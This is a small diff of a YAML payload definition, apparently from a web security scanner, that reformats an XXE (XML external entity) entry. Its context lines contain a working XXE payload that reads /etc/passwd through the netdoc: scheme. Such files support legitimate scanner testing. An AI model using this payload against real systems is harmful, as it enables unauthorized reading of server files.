@@ -1,4 +1,3 @@
----
 payload:
   - <!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY data SYSTEM "netdoc:/etc/passwd">]><foo>&data;</foo>
   - !!str |
@@ -10,5 +9,4 @@ encoder:
   - Plain
 placeholder:
   - XMLBody
-type: "XXE"
-...
+type: XXE
